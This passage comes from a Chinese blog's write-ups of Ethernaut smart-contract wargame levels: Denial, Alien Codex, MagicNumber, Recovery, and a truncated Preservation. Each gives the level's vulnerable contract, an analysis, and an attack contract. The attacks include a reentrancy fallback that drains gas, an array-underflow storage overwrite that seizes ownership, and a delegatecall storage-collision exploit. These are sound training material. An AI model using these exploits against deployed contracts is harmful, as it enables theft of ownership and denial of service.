title="分析"></a>分析</h2><p>我们的任务是在调用withdraw的时候，不让它执行成功，让他卡死在方法withdraw中。我们发现，这个方法里面有一个call，向一个未知的地址partner发送以太，那么，我们可以将这个未知的partner设置为一个合约Hack，合约设置重入陷阱。</p><p>只要有人调用withdraw，就会重入，不断给Hack合约发送以太直到消耗完所有的gas，卡死在call这一步而无法执行完成</p><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        address(0x3289a3d26E628A8e4868aF84fD66f57e5932E711).call(abi.encodeWithSignature(&quot;withdraw()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，攻击</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/20.Denial/image-20221228215551573.png" alt="image-20221228215551573"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/20.Denial/image-20221228215603399.png" alt="image-20221228215603399"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>19.Alien Codex</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/19.Alien%20Codex/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/19.Alien%20Codex/</url>
      
        <content type="html"><![CDATA[<h1 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：声明所有权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题有个import，然后继承了父类。import有问题，我们不import，直接写进来吧如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现，需要声明的所有权在父类中Ownable的_owner。但是我们发现，AlienCodex当中没用任何一个方法可以直接修改owner的值，但是有一个边长数组<code>bytes32[] public codex;</code>，并且有一系列方法可以操作它。</p><p>关键点：retract()方法直接将数组长度-1，然而没做任何越界处理。因此，如果初始状态codex=0，那么调用一次，就直接越界为0-1=2^256-1，即length=2^256-1。此时codex数组就包揽了AlienCodex在EVM所有的插槽！想修改AlienCodex的任何值，都可以通过codex这个数组来修改，我们可以通过revise()这个方法来修改</p><p>AlienCodex继承了Ownable，<code>_owner</code>在父类，那么<code>_owner</code>在AlienCodex中就是位于slot 0。那么我们通过codex来修改slot 0 的数据即可。</p><p>动态数组存储：keccak256(slot) + index</p><ul><li>slot 0：address private _owner;和bool public contact;</li><li>slot 1：bytes32[] public codex;</li></ul><p>codex的第一个元素位于slot keccak256(1) + 0，第二个元素位于slot keccak256(1) + 1，如此类推。</p><p>codex数组有2^256个元素，其第一个元素就是整个EVM存储大小2^256个存储插槽的slot 0，就是我们的<code>_owner</code>，算式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 = keccak256(slot 1) + index</span><br></pre></td></tr></table></figure><p>index就是我们要找的位置，重新排列一下，亦即︰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = 0 - keccak256(slot 1)</span><br></pre></td></tr></table></figure><ol><li>调用make_contact()，先将bool public contact;设置为true，满足modifier条件</li><li>调用retract()，使codex越界，范围变成0~(2^256)-1。</li><li>调用revise方法修改数据</li></ol><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    AlienCodex alienCodex = AlienCodex(0x8943c11061d211E6cb6D28c70af100f1F3805aC6);</span><br><span class="line">    </span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        alienCodex.make_contact();        </span><br><span class="line">        alienCodex.retract();    </span><br><span class="line">        uint index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));</span><br><span class="line">        //下面这种写法也行</span><br><span class="line">        //uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));</span><br><span class="line">        alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，攻击</p><p><img src="https://moe.photo/images/2022/12/28/image-20221228164842396.png" alt></p><p>通过</p><p><img src="https://moe.photo/images/2022/12/28/image-20221228164857112.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>18.MagicNumber</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/18.MagicNumber/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/18.MagicNumber/</url>
      
        <content type="html"><![CDATA[<h1 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：将solver赋予一个合约，该合约要求：合约的runtime code要求最多10个操作码，并且它返回42（0x2a）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>要解决这一关，我们需要自己手工创建一个合约，自己写操作码，当然我们首先要懂得一个合约的创建过程：Initialization opcodes 和 Runtime opcodes：</p><ul><li>Initialization opcodes：EVM创建合约并且存储Rumtime opcodes</li><li>Rumtime opcodes：包含我们的实际代码逻辑（即方法）：返回0x2a并且操作码数量不超过10个</li></ul><h3 id="编写Runtime-opcodes"><a href="#编写Runtime-opcodes" class="headerlink" title="编写Runtime opcodes"></a>编写Runtime opcodes</h3><p>我们的任务是用10个及以内的操作码来返回0x2a。思路：将0x2a存进内存，然后返回</p><p>存储0x2a的操作码：<code>mstore(p, v)</code>，操作码对应的十六进制值为52，将v的值赋予内存中以p位置开始的32字节</p><ul><li>v：存储的值</li><li>p：位置</li></ul><p>返回0x2a的操作码：<code>RETURN(p,s)</code>，操作码对应的十六进制值为f3</p><ul><li>p：索引，需要返回的数值在内存中的存放位置，那我们随便选一个吧：0x00。（每一个以太坊交易有2^256字节的临时内存空间使用）</li><li>s：存储数据的大小。用32个字节来存储0x2a，我猜测操作码中一个数值是用32字节来存储的</li></ul><p>然后我们来编写操作码：</p><p>（1）首先，将0x2a存到内存，使用<code>mstore(v, p)</code>操作码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">602a // v: push1 ox2a (存储0x2a)</span><br><span class="line">6000 // p: push1 ox00 (放到内存的0x00位置)</span><br><span class="line">52 // mstore</span><br></pre></td></tr></table></figure><p>（2）然后，从内存中把0x2a返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6020 // s:push1 ox20 (0x2a用0x20字节来存储)</span><br><span class="line">6000 // p: push1 0x00 (索引位置，我们放在了0x00)</span><br><span class="line">f3 // RETURN操作码</span><br></pre></td></tr></table></figure><p>操作码的序列就写好了，按照逻辑顺序连起来就是：<code>602a60005260206000f3</code>，刚刚好10个操作码，10个字节长</p><h3 id="编写Initialization-opcodes"><a href="#编写Initialization-opcodes" class="headerlink" title="编写Initialization opcodes"></a>编写Initialization opcodes</h3><p>具体思路：Initialization opcodes需要先复制runtime opcodes到内存中，然后再将Initialization opcodes返回到EVM。注意：EVM随后会自动将runtime opcodes（602a60005260206000f3）保存到区块链中，所以你不必操心这一步。</p><p>复制的操作码：<code>codecopy(s,f,t)</code>，从一个位置A复制到另一个位置B</p><ul><li>s：需要复制的内容的代码大小。我们的602a60005260206000f3大小是0x0a</li><li>f：需要复制的字节码的索引。注意：我们现在不知道是多少，因为这个字节码的位置排在Initialization opcodes后面，要先确定Initialization opcodes的大小才可以知道此处是多少</li><li>t：目标保存位置B</li></ul><p>（1）Initialization opcodes需要先复制runtime opcodes到内存中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">600a // s: push1 ox0a (10 bytes)</span><br><span class="line">60?? // f: push1 ox?? (运行时操作码的当前位置)</span><br><span class="line">6000 // t: push1 0x00 (目标内存索引0)</span><br><span class="line">39 // codecopy操作码</span><br></pre></td></tr></table></figure><p>（2）用RETURN操作码返回内存中的runtime opcodes到EVM中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">600a // s: push1  ox0a (runtime opcodes的长度)</span><br><span class="line">6000 // p: push1 ox00 (索引位置)</span><br><span class="line">f3 // RETURN操作码</span><br></pre></td></tr></table></figure><p>（3）我们的Initialization opcodes一共0x0c个字节。那么这就说明，Initialization opcodes后面跟着的runtime opcodes是在0x0c开始的。所以（1）的中代码现在可以补充完整了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">600a // s: push1 ox0a (10 bytes)</span><br><span class="line">600c // f: push1 0x0c (运行时操作码的当前位置)</span><br><span class="line">6000 // t: push1 0x00 (目标内存索引0)</span><br><span class="line">39 // codecopy操作码</span><br></pre></td></tr></table></figure><p>（4）连接Initialization opcodes、runtime opcodes，成为最终的bytecode：<code>0x600a600c600039600a6000f3602a60005260206000f3</code>。前12字节是Initialization opcodes，后10字节是runtime opcodes</p><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><p>使用create2操作码来生成合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">    MagicNum magicNum = MagicNum(0x2feD27cF90751EE2E48384307FCdf6924bB1c3Af);</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        //hex: 字符串转bytes</span><br><span class="line">        bytes memory bytecode = hex&quot;600a600c600039600a6000f3602a60005260206000f3&quot;; // T</span><br><span class="line">        //bytes memory bytecode = &quot;0x600a600c600039600a6000f3602a60005260206000f3&quot;; F =&gt;一个错误的新地址</span><br><span class="line">        //原因：bytes如果直接用&quot;&quot;写内容，里面的内容是会被转换为ASCII码值进行存储</span><br><span class="line">        //     比如:bytes public a = &quot;aa&quot;;===&gt;0x6161</span><br><span class="line">        //         bytes public b = hex&quot;aa&quot;;====&gt;0xaa</span><br><span class="line">        //bytes memory bytecode = &quot;600a600c600039600a6000f3602a60005260206000f3&quot;; F =&gt;solver被置为0</span><br><span class="line">        bytes32 salt = 0;</span><br><span class="line">        address solver;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            solver := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        magicNum.setSolver(solver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，攻击</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/18.MagicNumber/image-20221227195757917.png" alt="image-20221227195757917"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/18.MagicNumber/image-20221227195813076.png" alt="image-20221227195813076"></p><p>引用：<a href="https://cmichel.io/ethernaut-solutions/">1</a>，<a href="https://dac.ac/blog/ethernaut_solutions/#how-i-did-it">2</a>，<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">3</a>，<a href="https://stermi.medium.com/the-ethernaut-challenge-18-solution-magic-number-2cb8edee383a">4</a></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17.Recovery</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/17.Recovery/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/17.Recovery/</url>
      
        <content type="html"><![CDATA[<h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：</p><p>题目Recovery是一个工厂，可以不断的造SimpleToken合约。但是造出来SimpleToken合约之后，却不知道地址。</p><p>要求：题目造了一个SimpleToken合约，请你找到他，并且destroy他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-amp-做题"><a href="#分析-amp-做题" class="headerlink" title="分析&amp;做题"></a>分析&amp;做题</h2><p>我们发现，造合约的函数new之后没有用一个参数进行接收，那么我们就没有办法通过此合约得到造出来的这个合约地址。</p><p>但你懂的，区块链上很多东西都可以查，当然造了一个合约出来，难道会查不到？通过区块链浏览器，我们可以找到这个“丢失的”合约。</p><p>（1）得到题目实例地址：0xC40fD5F65ae26508a7aFE03F250353090C6071b8。既然丢失的SimpleToken合约是题目实例创建的，那么它肯定发起过交易来创建，我们在区块链浏览器查看题目实例地址</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/17.Recovery/image-20221224180228817.png" alt="image-20221224180228817"></p><p>看一眼新建的SimpleToken合约</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/17.Recovery/image-20221224180312881.png" alt="image-20221224180312881"></p><p>拿到了“丢失合约”，那么就destroy吧</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/17.Recovery/image-20221224180417409.png" alt="image-20221224180417409"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/17.Recovery/image-20221224180451569.png" alt="image-20221224180451569"></p><p>再看一眼SimpleToken合约</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/17.Recovery/image-20221224180505172.png" alt="image-20221224180505172"></p><h2 id="真正做题"><a href="#真正做题" class="headerlink" title="真正做题"></a>真正做题</h2><p>通过区块链浏览器来查看真没意思。创建合约当然是有自己的一套规则的，那么让我们来通过这一套规则，自己手动算出来丢失的合约地址吧！</p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16.Preservation</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/16.Preservation/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/16.Preservation/</url>
      
        <content type="html"><![CDATA[<h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：将owner修改为我们的钱包地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题和之前遇到其中一题原理一样，不做多阐述，见本博客文章[security-14]</p><p>交易的时候调高gas，否则交易会失败</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public 